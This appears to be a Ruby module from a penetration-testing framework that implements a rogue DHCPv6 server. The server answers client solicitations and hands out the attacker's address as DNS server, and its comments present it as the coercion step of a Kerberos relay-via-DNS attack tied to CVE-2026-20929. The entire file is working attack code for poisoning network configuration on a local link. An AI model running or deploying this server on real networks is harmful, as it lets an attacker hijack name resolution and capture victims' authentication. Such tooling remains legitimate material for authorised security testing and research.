# -*- coding: binary -*-

module Rex
  module Proto
    module DHCPv6
      # A minimal rogue DHCPv6 server (RFC 8415). It answers Solicit / Request /
      # Renew / Rebind / Confirm / Information-Request messages, handing the client
      # the attacker as its DNS server (and, for stateful requests, a leased
      # address). This is the native coercion primitive behind the Kerberos relay
      # via DNS (CVE-2026-20929): once the attacker is the client's DNS server, a
      # paired DNS server poisons the target name to coerce authentication.
      #
      # Request parsing and response construction live in {#handle_request}, kept
      # separate from the socket I/O so the protocol behaviour is unit-testable.
      class Server
        include Rex::Socket

        # @param dns_servers [Array<String>] DNS server IPv6 address(es) to hand out
        #   (the attacker); defaults to the server's own link address at start time.
        # @param assigned_address [String, nil] address to lease for stateful (IA_NA) requests
        # @param domain_list [Array<String>, nil] optional DNS search domains
        # @param server_mac [String, nil] link-layer address for the server DUID (random if nil)
        # @param listen_host [String] local bind address (all IPv6 by default)
        # @param interface [String, nil] interface name to bind / join multicast on
        # @param context [Hash] Rex socket context
        #
        # Lease lifetimes default to 300s/600s and can be overridden via the
        # +preferred_lifetime+ / +valid_lifetime+ accessors.
        def initialize(dns_servers: [], assigned_address: nil, domain_list: nil, server_mac: nil,
                       listen_host: '::', interface: nil, context: {})
          self.dns_servers = dns_servers
          self.assigned_address = assigned_address
          self.domain_list = domain_list
          self.server_duid = Packet.duid_ll(server_mac || random_mac)
          self.listen_host = listen_host
          self.interface = interface
          self.preferred_lifetime = 300
          self.valid_lifetime = 600
          self.context = context
          self.sock = nil
        end

        # A block invoked with (message_type, client_host, request_packet) each
        # time a request is answered, for logging / reporting.
        def on_request(&block)
          self.reporter = block
        end

        # Start listening and answering DHCPv6 requests.
        def start
          self.sock = Rex::Socket::Udp.create(
            'LocalHost' => listen_host,
            'LocalPort' => Constants::SERVER_PORT,
            'Context' => context,
            'Ipv6' => true
          )

          if interface && !interface.empty?
            begin
              sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_BINDTODEVICE, "#{interface}\0")
            rescue StandardError => e
              elog("Failed to bind DHCPv6 server to #{interface}", error: e)
            end
          end

          join_multicast_group

          self.thread = Rex::ThreadFactory.spawn('DHCPv6ServerMonitor', false) { monitor_socket }
        end

        def stop
          thread.kill if thread
          begin
            sock&.close
          rescue StandardError => e
            elog('Failed to close DHCPv6 server socket', error: e)
          end
          self.sock = nil
        end

        # Parse a raw client message and build the rogue response bytes.
        #
        # @param buf [String] the received DHCPv6 message
        # @return [Array(Integer, String), nil] the response message type and its
        #   encoded bytes, or nil if the message is not one we answer.
        def handle_request(buf)
          request = Packet.read(buf)
          response = Packet.build_response(
            request: request,
            server_duid: server_duid,
            dns_servers: dns_servers,
            assigned_address: assigned_address,
            preferred_lifetime: preferred_lifetime,
            valid_lifetime: valid_lifetime,
            domain_list: domain_list
          )
          return nil if response.nil?

          [request.msg_type, response.to_binary_s]
        rescue StandardError => e
          elog('Failed to handle DHCPv6 request', error: e)
          nil
        end

        attr_accessor :dns_servers, :assigned_address, :domain_list, :server_duid,
                      :listen_host, :interface, :preferred_lifetime, :valid_lifetime,
                      :context, :sock, :thread, :reporter

        protected

        def monitor_socket
          loop do
            readable, = ::IO.select([sock], nil, nil, 1)
            next unless readable && readable[0] == sock

            buf, addr = sock.recvfrom(65535)
            next if buf.nil? || buf.empty?

            client_host = addr[3]
            result = handle_request(buf)
            next if result.nil?

            msg_type, response = result
            # DHCPv6 clients listen on the client port; reply to the source address.
            sock.sendto(response, client_host, Constants::CLIENT_PORT)
            reporter&.call(msg_type, client_host, buf)
          end
        end

        # Join the well-known DHCPv6 multicast group so the socket receives the
        # multicast Solicit/Request messages clients send. Best-effort: platforms
        # and interface indices vary, so failure is logged rather than fatal.
        def join_multicast_group
          group = Rex::Socket.addr_aton(Constants::ALL_DHCP_RELAY_AGENTS_AND_SERVERS)
          ifindex = interface_index
          sock.setsockopt(::Socket::IPPROTO_IPV6, ipv6_join_group_opt, group + [ifindex].pack('N'))
        rescue StandardError => e
          elog('Failed to join DHCPv6 multicast group', error: e)
        end

        def ipv6_join_group_opt
          if ::Socket.const_defined?(:IPV6_JOIN_GROUP)
            ::Socket::IPV6_JOIN_GROUP
          else
            ::Socket::IPV6_ADD_MEMBERSHIP
          end
        end

        def interface_index
          return 0 if interface.nil? || interface.empty?

          ::Socket.getifaddrs.find { |ifaddr| ifaddr.name == interface }&.ifindex || 0
        end

        def random_mac
          # 0x02 in the first octet marks the address locally administered
          "\x02".b + Random.new.bytes(5)
        end
      end
    end
  end
end
